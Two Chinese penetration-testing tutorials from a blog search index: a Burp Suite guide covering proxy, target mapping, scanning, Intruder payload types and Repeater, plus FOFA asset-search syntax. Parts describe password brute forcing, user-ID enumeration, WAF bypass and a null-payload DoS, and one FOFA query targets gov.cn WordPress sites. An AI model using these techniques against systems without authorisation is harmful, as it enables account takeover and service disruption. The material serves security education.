<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Burpsuite 从入门到精通desu</title>
    <url>/2024/07/08/Burpsuite%20%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/</url>
    <content><![CDATA[<h1><span id="burpsuite从入门到入土">Burpsuite从入门到入土</span></h1><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717192021781.png" alt="image-20240717192021781"></p>
<p>在Burp suite的使用中，会出现如下的选项</p>
<h2><span id="raw">Raw：</span></h2><p>视图主要显示web请求的真实格式，包含请求地址，http协议版本，主机头。浏览器信息，Accept可接受的内容类型，字符集，编码方式，cookie等。通过手工修改这些信息可以完成一些渗透测试的工作</p>
<h2><span id="params">Params:</span></h2><p>主要显示客户端请求的参数信息 ，包括GET和POST传参aders：</p>
<p>这个视图显示的信息和Raw的信息类似，只不过这个更加直观</p>
<h2><span id="hex">Hex：</span></h2><p>这个视图显示Raw的十六进制内容</p>
<p>一般开启Burp Proxy是不会拦截静态文件的，同时用户可以修改拦截作用域个性化Burp的使用效果。所有拦截到的信息和历史信息都可以通过右击弹出菜单，发送到其他组件。，<strong>如Scanner、Repeater、Intruder、Sequencer、Decoder、 Comparer、Extender等</strong></p>
<h2><span id="数据拦截与控制">数据拦截与控制</span></h2><p>较为基础</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240706203308670.png" alt="image-20240706203308670"></p>
<h1><span id="burp的相关配置">Burp的相关配置</span></h1><p>当我们打开可选项设置选项卡Options，从界面显示来看，常用的部分主要包括以下几大板块（涉及 https的功能不包含在本章内容里，后面会一章专门叙述）：</p>
<h2><span id="客户端请求消息拦截">客户端请求消息拦截</span></h2><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240706203532487.png" alt="image-20240706203532487"></p>
<p>这个可以通过添加一些个性化的条件语句</p>
<h3><span id="有四个选项">有四个选项</span></h3><p>操作符的与或非</p>
<p>匹配类型（可以基于域名 IP地址 协议 请求方法 URL  文件类型 参数 cookies 头部</p>
<p>内容 状态码）</p>
<p>关系：关系则是匹配或不匹配</p>
<p>条件：条件则是对关键字的一些要求</p>
<p><a href="https://blog.csdn.net/YuiJar/article/details/81316478">正则表达式的语法及匹配规则（基础）_正则匹配位不定长度的-CSDN博客</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240706204059953.png" alt="image-20240706204059953"></p>
<p>勾选自动修复丢失行可以防止一些用户在修改数据包过程中的失误，比如请求空行忘记给出等</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240706204227208.png" alt="image-20240706204227208"></p>
<p>如果 自动更新文本长度被选中，则当请求消息被修改后，Content-Length也 会自动被修改，替换为与之相对应的值。</p>
<h2><span id="服务端返回消息拦截">服务端返回消息拦截</span></h2><p> 基本和代理拦截规则一致</p>
<h2><span id="服务端返回消息修改">服务端返回消息修改</span></h2><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240706204353108.png" alt="image-20240706204353108"></p>
<h2><span id="正则表达式配置">正则表达式配置</span></h2><p>正则表达式主要用于自动替换请求信息或者响应包返回信息的某些值和文本</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240706204545884.png" alt="image-20240706204545884"></p>
<h1><span id="历史记录">历史记录</span></h1><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240706204640322.png" alt="image-20240706204640322"></p>
<p>HTTP history界面由筛选过滤器、历史记录列表、消息详情3个部分组成。</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240706204755399.png" alt="image-20240706204755399"></p>
<p>单击可以查看请求包和响应包</p>
<p><strong>在消息上双击则会弹出此条消息的详细对话框</strong></p>
<p>当我们在做系统的安全评估过程中，会在HTTP history中保存了大量的日志记录，为了更便捷的管理历 史消息，Burp提供了筛选过滤器功能。当我们点击HTTP history标签下的Filter时，将弹出筛选过滤器界 面。</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240706204953362.png" alt="image-20240706204953362"></p>
<p>按照过滤条件的不同，筛选过滤器划分出7个子板块，分别是 </p>
<h2><span id="按照请求类型过滤">按照请求类型过滤：</span></h2><p>你可以选择仅显示当前作用域的、仅显示有服务端响应的和仅显示带有请求参 数的消息。当你勾选“仅显示当前作用域”时，此作用域需要在Burp Target的Scope选项中进行配 置，需要搭配Burp Target使用（后面会说）。 </p>
<h2><span id="按照mime类型多用途互联网邮件扩展类型过滤">按照MIME类型（多用途互联网邮件扩展类型）过滤：</span></h2><p>你可以控制是否显示服务端返回的不同文件 类型的消息，比如只显示HTML、CSS或者图片。过滤器目前支持HTML、Script、XML、CSS、其 他文本、图片、Flash、二进制文件8种形式。 </p>
<h2><span id="按照服务器返回的http状态码过滤">按照服务器返回的HTTP状态码过滤：</span></h2><p>Burp根据服务器的状态码，按照2XX，3XX，4XX，5XX分别 进行过滤。比如，如果你只想显示返回状态码为200的请求成功消息，则勾选2XX。</p>
<h2><span id="按照查找条件过滤">按照查找条件过滤：</span></h2><p>此过滤器是针对服务端返回的消息内容，与输入的关键字进行匹配，具体的匹 配方式，你可以选择 （1）正则表达式 （2）大小写敏感 （3）否定查找 三种方式可以任意组合，前面两种匹配方式容易理解，第3种匹配方式是指与关键字匹配上的将不 再显示。 </p>
<h2><span id="按照文件类型过滤">按照文件类型过滤：</span></h2><p>通过文件类型在过滤消息列表，这里有两个选择可供操作。一是仅显示哪些， 另一个是不显示哪些。如果是仅显示哪些，在show only的输入框中填写显示的文件类型，同样， 如果不显示哪些文件类型，只要在hide的输入框中填写不需要显示的文件类型即可。</p>
<h2><span id="按照注解过滤">按照注解过滤：</span></h2><p>此过滤器的功能是指，根据每一个消息拦截时候的备注或者是否高亮来作为筛选条 件控制哪些消息在历史列表中显示。 </p>
<h2><span id="按照监听端口过滤">按照监听端口过滤：</span></h2><p>此过滤器通常使用于当我们在Proxy Listeners中多个监听端口时，仅仅显示某 个监听端口通信的消息，一般情况下，搭配中间件、数据库等漏洞使用。</p>
<h1><span id="ssl和proxy高级选项">SSL和Proxy高级选项</span></h1><h2><span id="http协议信息的拦截和处理">HTTP协议信息的拦截和处理：</span></h2><h2><span id="监听设置">监听设置</span></h2><p>监听设置包含三块功能:</p>
<ol>
<li><h1><span id="binding端口绑定模式">Binding（端口绑定模式）</span></h1><p>Binding绑定的端口是指Burp Proxy代理服务监听的端口，绑定IP地址 分为本地回路、所有接口、指定地址三种模式，在渗透测试中，无论选择哪种模式，需要明白一 点，当选择非本地回路IP地址时，同局域网内的其他电脑也可以访问你的监听地址</p>
<p>—也就是说,其他电脑的数据包也会被你的burpsuite拦截.但不要因此形成认知上的误区</p>
<p>虽然Burp Suite无法自动实现对整个局域网所有流量的监听，但通过手动配置代理或设置透明代理，可以在一定程度上实现对局域网内多个设备流量的拦截。需要注意的是，这些操作通常需要管理员权限和详细的网络配置</p>
</li>
<li><h1><span id="request-handling请求处理">Request Handling（请求处理）</span></h1><p>主要是用来控制接收到Burp Proxy监听端口的请求后，如何对 请求进行处理的，即使用Burp再次转发。 </p>
<p>其具体配置可分为：主机名&#x2F;域名的转发、端口的转发、强制使用SSL和隐形代理4个部分。当我们 配置了主机或域名的转发，则所有的请求会转发到指定的主机或域名上；如果我们配置了端口的转 发时，所有的请求都会被转发到指定端口上。同时我们可以配置，通过Burp Proxy的消息是否强制 使用SSL，如果设置了此项，则请求若是http协议，经Burp Proxy代理后将转换为https协议。隐形 代理主要是用于测试富客户端应用或者是非浏览器代理方式的应用，当我们设置了它，访问这些应 用时，将通过<strong>非代理的方式，直接连接Burp Proxy的监听端口</strong>。</p>
<p>不挂代理的方式有其独特的意义和应用场景，特别是在一些特殊情况下，无法直接通过设置代理来拦截和分析流量。以下是一些不挂代理的方式及其意义：</p>
<h3><span id="意义和应用场景">意义和应用场景</span></h3><ol>
<li><strong>移动应用测试</strong>：有些移动应用不提供代理设置选项，或者应用的流量硬编码到特定的IP地址或域名。在这种情况下，使用代理进行流量拦截变得非常困难，通过非代理方式（如DNS欺骗或网络重定向）可以解决这个问题。</li>
<li><strong>嵌入式设备测试</strong>：一些嵌入式设备（如物联网设备、智能家居设备）不允许配置代理设置。通过网络设备（如路由器、防火墙）上的规则重定向流量，可以实现对这些设备流量的拦截和分析。</li>
<li><strong>绕过代理检测</strong>：某些系统或应用可能会检测并拒绝代理流量，使用非代理方式可以避免这种检测，从而进行更隐蔽的流量分析。</li>
<li><strong>网络设备测试</strong>：在测试一些需要透明代理或中间设备（如网关、VPN）的场景下，非代理方式可以帮助实现透明的流量拦截和分析，而不会对客户端配置造成影响。</li>
</ol>
</li>
</ol>
<h1><span id="burp-target">Burp Target</span></h1><p>1. </p>
<p>Burp Target 组件主要包含<strong>站点地图、目标域、风险定义</strong>三部分组成</p>
<p>当前工作涉及哪些目标域、可能存在的攻击面等信息，下面我们就分别来看看 Burp Target的三个组成部分。</p>
<p>本章的主要内容有：</p>
<h2><span id="目标域设置-target-scope">目标域设置 Target Scope</span></h2><p>Target Scope中作用域的定义比较宽泛，通常来说，在对某个系统进行渗透测试时，可以通过域名或者 主机名去限制拦截内容，这里的域名或主机名就是我们说的作用域。如果我们想限制得更为细粒度化， 比如，你只想拦截login目录下的所有请求，也可以在此设置，此时，作用域就是目录。总体来说， Target Scope主要使用于下面几种场景中：</p>
<p>限制站点地图和Proxy历史中的显示结果</p>
<p> 告诉Burp Proxy拦截哪些请求 </p>
<p>Burp Spider抓取哪些内容 </p>
<p>Burp Scan自动扫描哪些作用域的安全漏洞 </p>
<p>在Burp Intruder和Burp Repeater中指定URL 通过Target Scope我们能方便地控制Burp的拦截范围、操作对象，减少无效的噪音（此处演示一下）。 </p>
<h2><span id="站点地图-site-map">站点地图 Site Map</span></h2><p>当我们设置了 Target Scope（默认全部为允许），使用Burp Proxy进行代理拦截，通过浏览器代理浏览 应用时，Burp会自动将浏览信息记录下来，包含每一个请求和应答的详细信息，保存在Target站点地图 中。</p>
<p>Site Map的左边为访问的URL，按照网站的层级和深度，树形展示整个网站的目 录结构和关联其他域的URL情况；</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240707084335435.png" alt="image-20240707084335435"></p>
<p>对该树状结构进行扫描，还可以进行进一步的主动扫描，从而发现一些潜在的风险</p>
<h2><span id="target-工具的使用">Target 工具的使用</span></h2><p>Target 工具的使用的使用主要包括以下部分：</p>
<h3><span id="手工获取站点地图">手工获取站点地图</span></h3><p>1、设置浏览器代理和Burp Proxy代理，并使之能正常工作。</p>
<p> 2、关闭Burp Proxy的拦截功能。</p>
<p> 3、手工浏览网页，这时，Target会自动记录站点地图信息。</p>
<p>手工获取站点地图可以使用户根据自己的需要和分析自主控制访问的内容。</p>
<p>记录的信息比较准确，但对于大型的系统而言依次点击一遍对渗透测试人员而言成本比较大</p>
<h3><span id="站点比较">站点比较</span></h3><p>站点比较更为简单,本质就是将站点的结构进行对比</p>
<h4><span id="攻击面分析">攻击面分析</span></h4><p>右击对应的站点，能够通过相关工具中的分析选项做攻击面分析</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240707085712514.png" alt="image-20240707085712514"></p>
<p>概况视图主要展示当前站点动态URL数量、静态URL数量、参数的总数、唯一的参数名数目，通过这些 信息，可以快速帮助我们对当前站点的总体状况建立粗线条的了解。</p>
<p>动态URL和静态URL对应的都可以查看详细的请求包和响应包</p>
<p>参数视图有上中下三部分组成，上部为参数和参数计数统计区，你可以对参数的使用次数进行排序， 从而找出使用频繁的参数进行分析；中部为参数对应的使用情况列表，记录对应的参数每一次的使用记 录；下部为某一次使用过程中，请求消息和应答消息的详细信息。</p>
<p>实际使用中很多站点使用伪静态，如果请求的URL中不带有参数，则分析时无法区别，只能当作静态URL来分析</p>
<h2><span id="discover-content">Discover Content</span></h2><p>存在于Burp Target中的站点信息,我们可以直接发送到spider中进行站点信息的爬取.在Burp1.7版本中,存在一个独立模块,叫做Burp Spider,而Burp2.0更新后的本本后,该模块被整合为Targe相关工具中的Discover Content</p>
<p>Discover Content主要用于大型操应用系统的测试</p>
<p>Discover Content的使用主要包含三个方面</p>
<h3><span id="控制">控制</span></h3><p>Discover Content 控制界面由发现会话状态（Discovery Session Status）和排列任务（Queued Tasks）两部分组成。</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240707091342086.png" alt="image-20240707091342086"></p>
<h3><span id="配置">配置</span></h3><p>配置界面由Target,Filenames,File Extensions,Discovery Engine四个功能组成</p>
<p>对应的可以根据自己的需要进行一些筛选配置</p>
<h3><span id="站点地图">站点地图</span></h3><p>站点地图（Site Map） 爬取完成后形成的站点地图，和Target模块中的站点地图类似。</p>
<h1><span id="burp-scan">Burp Scan</span></h1><p>Burp Scan的功能主要是用来自动检测Web系统的各种漏洞，可以使用Burp Scan代替测试人员手工去对 系统进行普通漏洞类型的渗透测试，从而使得测试人员能把更多精力放在那些需要人工验证的漏洞上。</p>
<p>BurpScan是很传统的扫描器,没有什么需要额外提及的</p>
<p>不过这里还是有一些点需要额外考虑</p>
<p>Burp使用被动扫描时为了使流量更接近于普通用户,几乎不额外构造请求进行爬虫或扫描,它基于已经存在的请求和响应进行简单的分析</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240707092650449.png" alt="image-20240707092650449"></p>
<p>Burp使用主动扫描模式时则会对应用发送新的请求并通过payload验证漏洞,这种模式下的操作回产生大量的请求和响应数据,直接影响系统的性能,通常适用于非生产环境</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240707095413391.png" alt="image-20240707095413391"></p>
<h2><span id="扫描配置">扫描配置</span></h2><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240707095705268.png" alt="image-20240707095705268"></p>
<p>Scan Type：扫描类型，分为 Crawl and audit 和 Crawl，即爬虫和审计，或者仅爬虫。</p>
<p> URLs to Scan：扫描目标URL Detailed scope configuration：详细的范围配置，通过 Included URL prefixes（包括URL前缀）和 Excluded URL prefixes（不包括URL前缀）来配置扫描。</p>
<p> Use advanced scope control：使用高级的范围控制，如果勾选，将配置 Included URLs（包含的 URL）和Excluded URLs（不包含的URL）来配置扫描。 </p>
<p>点击 Add，弹出配置窗口：</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240707100020676.png" alt="image-20240707100020676"></p>
<p>**PS:**协议:包含HTTP和HTTPS或者任意</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240707100240814.png" alt="image-20240707100240814"></p>
<p>如果需要登录,可以提前配置username和password</p>
<p>导出扫描报告</p>
<p> 1.在Target-&gt;Site Map，选择某个URL，右侧Issues按ctrl+a全选，右键，点击Report selected issues</p>
<p>2.选择报告格式 HTML：生成HTML格式的报告，以便在浏览器中打印或查看。 XML：生成XML格式的报告，适合导入其他工具或报告框架</p>
<h1><span id="burp-intruder">Burp Intruder</span></h1><p>在渗透测试过程中，我们经常使用Burp Intruder，它的工作原理是：Intruder在原始请求数据的基础 上，通过修改各种请求参数，以获取不同的应答。每一次请求中，Intruder都会携带一个或多个有效攻 击载荷（payload），在不同位置进行攻击重放，通过应答数据的比对分析来获得需要的特征数据。</p>
<h2><span id="intruder使用场景">Intruder使用场景</span></h2><h3><span id="标识符枚举">标识符枚举</span></h3><p>Web应用程序经常使用标识来引用用户,账户,资产等数据信息. 例如用户名 文件ID和账户密码</p>
<h3><span id="提取有用数据">提取有用数据</span></h3><p>在某些场景下,并非简单的识别有效标识符.而是通过识别标识符提取一些其他的数据.比如单个用户的个人空间ID,获取所欲用户在个人空间的昵称和年龄</p>
<h3><span id="模糊测试">模糊测试</span></h3><p>很多输入型的漏洞,如SQL注入,跨站脚本和文本路径遍历等都可以通过修改请求参数提交各种测试字符串. 可以通过Intruder的自动化来实现对Web应用的模糊测试</p>
<p>通常来说</p>
<p>BurpIntruder的测试主要遵循以下步骤</p>
<ol>
<li><p>确认BurpSuite安装正确并正常启动，且完成了浏览器的代理设置。</p>
</li>
<li><p>进入Burp Proxy选项卡，关闭代理拦截功能。</p>
</li>
<li><p>进行历史日志（History）子选项卡，查找可能存在问题的请求日志，并通过右击菜单，发送到 Intruder。 </p>
</li>
<li><p>进入 Intruder 选项卡，打开 Target 和 Positions 子选项卡。这时，你会看到上一步发送过来的请 求消息。</p>
</li>
<li><p>Burp Intrude<strong>r 攻击的基础是围绕刚刚发送过来的原始请求信息，在原始信息指定的位置上设置一 定数量的攻击载荷 Payload</strong>，通过替换 Payload 来发送不同的请求以获取应答消息。默认情况下<strong>， Burp Intruder 会对请求参数和 Cookie 参数设置成 Payload position，前缀添加 $ 进行标识，如 上图红色标注位置所示。当发送请求时，会将$标识的参数替换为 Payload 。</strong></p>
</li>
<li><p>在光标对应位置选择右侧选项,就可以添加或删除<strong>预留出的payload位置</strong></p>
<p>预留出payload位置则是为了使Intruder在对应位置中遍历预设的payload集,发送大批数据包</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240707104227760.png" alt="image-20240707104227760"></p>
</li>
<li><p>在payload子选项卡中可以选择payload的生成策略,比如id&#x3D;1-100不断遍历</p>
</li>
<li><p>最后做一遍检查,便可以开始爆破,后续可以开始阅览Intruder返回的通信信息,查看是否有自己需要的信息</p>
</li>
<li><p>有些时候为了防止应答信息太多无法检索出我们需要的信息,通常在进行攻击前,会进行Options选项的相关配置,使用最多的是正则表达式匹配</p>
</li>
<li><p>攻击结果也是可以将展示出的信息做一些指定的,比如攻击时间和是否存在Error等</p>
</li>
</ol>
<h2><span id="payload类型与处理">Payload类型与处理</span></h2><p>payload类型足足有18种可供选择,这里挑选常用的几种记录</p>
<h3><span id="简单列表">简单列表:</span></h3><p>通过配置一个字符串列表作为payload,也可以手动添加字符串列表或者从文件加载字符串列表</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240707111535806.png" alt="image-20240707111535806"></p>
<p>对应的 burp预设了很多组简单payload列表</p>
<p>包括XSS脚本 CGI脚本 SQL注入脚本 数字 大写小写字母  用户名 密码 表单域的字段名 IIS文件名和目录名等</p>
<h3><span id="指定文件">指定文件</span></h3><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240707111717409.png" alt="image-20240707111717409">可以指定文件作为相对应payload位置上的列表</p>
<h3><span id="自定义迭代器">自定义迭代器</span></h3><p>这是一款功能强大的Payload，它共有8个占位，每一个占位 可以指定简单列表的Payload类型，然后根据占位的多少，与每一个简单列表的Payload进行笛卡 尔积（集合相乘的结果），生成最终的Payload列表</p>
<h4><span id="payload设置">payload设置</span></h4><p>如图例</p>
<p>位置1 –从列表选择用户名带入</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240707114033155.png" alt="image-20240707114033155"></p>
<p>位置2 –可以直接设置值 比方说@@</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240707114135696.png" alt="image-20240707114135696"></p>
<p>位置3 –也可以从文件加载</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240707114300016.png" alt="image-20240707114300016"></p>
<p>最后攻击时生成的payload则会按照迭代的占位依次排列</p>
<p>如图所示</p>
<img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240707115021293.png" alt="image-20240707115021293" style="zoom:200%;">

<h3><span id="字符串替换">字符串替换</span></h3><p>– 顾名思义，<strong>该Payload的类型是对预定义的字符串进行替换后生成新的字符串。</strong>比如说，预定义字符串为ABCD，按照下图的替换规则设置后，将对AB的值 进行枚举后生成新的字符串</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240707153759117.png" alt="image-20240707153759117"></p>
<p><strong>如图攻击,如果满足替换条件,它则会将原payload和修改后的payload一起发送到服务端.</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240707153954509.png" alt="image-20240707153954509"></p>
<h3><span id="大小写替换">大小写替换</span></h3><p>对预定义的字符串，按照<strong>大小写规则进行替换</strong>。比如，预定义 的字符串为Peter Wiener，则按照下图的设置后，会生成新的Payload。</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240707154240220.png" alt="image-20240707154240220"></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240707154302311.png" alt="image-20240707154302311"></p>
<p>生成规则由上而下依次是：</p>
<p> No change（不改变，使用原始字符串）</p>
<p> To lower case（转为小写字母） </p>
<p>To upper case（转为大写字母） </p>
<p>To Propername（首字母大写，其他小写） </p>
<p>To ProperName（单词首字母大写，其他不改变)</p>
<p> 在实际使用中，可以根据自己的使用规则进行勾选设置。</p>
<h3><span id="字符块">字符块</span></h3><p>这种类型的Payload是指使用一个给出的输入字符串，根据指定设 置产生指定大小的字符块，表现形式为生成指定长度的字符串。它通常是用来绕过应用防火墙 （WAF）。</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240707154649754.png" alt="image-20240707154649754"></p>
<h3><span id="数字类型">数字类型</span></h3><p>这种类型的payload是根据配置,生成一系列的数字作为payload.它的设置界面如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240707154817322.png" alt="image-20240707154817322"></p>
<p>数字范围部分就是确定最大和最小值以及最大值和最小值所构成的范围中如何取数字,类型分为按顺序和随机遍历给出的数字集合</p>
<h3><span id="日期类型">日期类型</span></h3><p>根据配置生成一系列的日期</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240707155611480.png" alt="image-20240707155611480"></p>
<p>配置比较简单 不过多赘述</p>
<h3><span id="暴力字典brute-forcer">暴力字典（Brute forcer）</span></h3><p>此类Payload生成包含一个指定字符集的所有特定长度排列的有效载 荷，通常用于枚举字典的生成，其设置界面如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240707160307554.png" alt="image-20240707160307554"> </p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240707160255421.png" alt="image-20240707160255421"></p>
<p>空类型（Null payloads）</p>
<p>这种负载类型产生的Payload，其值是一个空字符串。在攻击时，<strong>如果 需要同样的请求反复被执行</strong>，在不任何修改原始请求的场景下此Payload是非常有用的。<strong>它可用于 各种攻击，例如应用层DOS、或保持活会话令牌、资源竞争等。</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240707160640648.png" alt="image-20240707160640648"></p>
<p><strong>这样就近似于实现了单台机的DOS攻击</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240707160655083.png" alt="image-20240707160655083"></p>
<h3><span id="字符扮演者character-frobber">字符扮演者（Character frobber）</span></h3><p>依次修改指定字符串在每 个字符位置的值（不做特殊说明的情况下就是指十进制），每次都是在原字符上递增1个该字符的 ASCII码。</p>
<h3><span id="用户名生成器">用户名生成器</span></h3><p>这种类型的Payload主要用于用户名和Email账号的自动 生成，其设置界面如下图：</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240707160956758.png" alt="image-20240707160956758"></p>
<h2><span id="攻击类型">攻击类型</span></h2><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240707161315912.png" alt="image-20240707161315912"></p>
<h2><span id="可选项设置">可选项设置</span></h2><h3><span id="请求消息头设置">请求消息头设置</span></h3><p>请求消息头设置中包含<strong>自动更新Content-Length</strong>和<strong>Set Connection: close</strong></p>
<p>如果选中了设置Connection报头,那么Burp Intruder则会在每个消息中都更新对应的Connection Close报头</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240707162113734.png" alt="image-20240707162113734"></p>
<h3><span id="攻击结果设置">攻击结果设置</span></h3><p>这个设置主要用来控制从响应信息中提取结果项,如果 匹配,则在攻击结果中添加新列进行标明</p>
<p>比如在”密码不正确”攻击中遍历一个大字典,这个时候payload数量过大,这个时假设还无法从可疑的对话长度等方面入手,就chenggongv可以通过扫描诸如”Incorrect password”等等找到成功的登录.</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240707161925846.png" alt="image-20240707161925846"></p>
<h3><span id="重定向">重定向</span></h3><p>这些设置是主要用于控制执行攻击时Burp如何处理重定向,在实际使用中必须遵循重定向才能实现目的</p>
<p>比如密码猜测攻击中,如果密码错误可能会重定向响应到密码错误的提示界面,密码正确则会重定向到用户中心首页等</p>
<h3><span id="intruder攻击和结果分析">Intruder攻击和结果分析</span></h3><p>攻击的发起分为两种方式,一种是经过对应的Target ,Positions,payloads,options等再经过启动进行攻击,另一种则是通过预攻击文件直接发起攻击,攻击结果页面如下所示</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240707170729022.png" alt="image-20240707170729022"></p>
<p>从上图我们可以看出，其界面主要有菜单区、过滤区、消息记录区、请求&#x2F;响应区四部分组成。</p>
<p>菜单区——包含Attack菜单、Save菜单、Columns菜单。</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240707170959048.png" alt="image-20240707170959048"></p>
<p>过滤区——可以通过查询条件、服务器响应的状态码、注释对消息记录区的信息进行过滤。</p>
<p>消息记录区，又称结果列表（Results Table），记录Payload执行时请求和响应的所有信息，</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240707171015761.png" alt="image-20240707171015761"></p>
<p>在对攻击结果的分析中，你可以通过单击任一列标题（升序排序，降序排序和未排序）重新排序表的内 容。有效的应答通常可以通过以下存在差异的内容进行判断：</p>
<h1><span id="burp-repeater">Burp Repeater</span></h1><p> Repeater是对消息的手动改动和迭代的进程,在渗透测试过程中我们经常使用Repeater来进行请求与响应的消息验证分析,比如修改请求参数 验证输入的漏洞 验证逻辑越权等</p>
<p>其设置主要包括以下内容： </p>
<p>更新（Update Content-Length） 这个选项是用于控制Burp是否自动更新请求消息头中的 Content-Length。 </p>
<p>解压和压缩（Unpack gzip &#x2F; deflate） 这个选项主要用于控制Burp是否自动解压或压缩服务端响 应的内容。</p>
<p> 跳转控制（Follow redirections） 这个选项主要用于控制Burp是否自动跟随服务端进行请求跳 转，比如服务端返回状态码为302，是否跟着应答跳转到302指向的URL地址。 它有4个选项，分别 是永不跳转（Never），站内跳转（On-site only）、目标域内跳转（In-scope only）、始终跳转 （Always）。其中永不跳转、始终跳转比较好理解，站内跳转是指当前的同一站点内跳转，目标域 跳转是指Target scope中配置的域可以跳转。 </p>
<p>跳转中处理Cookie（Process cookies in redirections） 这个选项如果选中，则在跳转过程中设置 的Cookie信息，将会被带到跳转指向的URL页面，可以进行提交。</p>
<p> 视图控制（View） 这个选项是用来控制Repeater的视图布局。</p>
<p> 其他操作（Action） 通过子菜单方式，指向Burp的其他工具组件中</p>
]]></content>
      <categories>
        <category>Penetration Testing Basic</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>fofa常用语法</title>
    <url>/2024/07/17/fofa%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<h1><span id="如读者有未授权渗透行为后果自负本站仅作学习用途">如读者有未授权渗透行为，后果自负，本站仅作学习用途</span></h1><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717112339739.png" alt="image-20240717112339739"></p>
<h2><span id="fofa">fofa</span></h2><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717192204406.png" alt="image-20240717192204406"></p>
<p>直接输入查询语句，将从标题，html内容，http头信息，url字段中搜索；如果查询表达式有多个与或关系，尽量在外面用（）包含起来；</p>
<p>&#x3D;&#x3D;完全匹配的符号，可以加快搜索速度，比如查找qq.com所有host，可以是domain&#x3D;&#x3D;”qq.com”</p>
<h1><span id="高级搜索">高级搜索</span></h1><table>
<thead>
<tr>
<th>可以使用括号 和 &amp;&amp;</th>
<th></th>
<th>!&#x3D;等符号，如</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title=&quot;powered by&quot; &amp;&amp; title!=&quot;discuz&quot; </span><br><span class="line"></span><br><span class="line">body=&quot;content=WordPress&quot; || (header=&quot;X-Pingback&quot; &amp;&amp; header=&quot;/xmlrpc.php&quot; &amp;&amp; body=&quot;/wp-includes/&quot;) &amp;&amp; host=&quot;gov.cn&quot;</span><br></pre></td></tr></table></figure>

<h1><span id="语法">语法</span></h1><p>title&#x3D;”beijing” 从标题中搜索“北京”</p>
<p>header&#x3D;”elastic” 从http头中搜索“elastic”</p>
<p>body&#x3D;”网络空间测绘” 从html正文中搜索“网络空间测绘”</p>
<p>domain&#x3D;”qq.com” 搜索根域名带有qq.com的网站。</p>
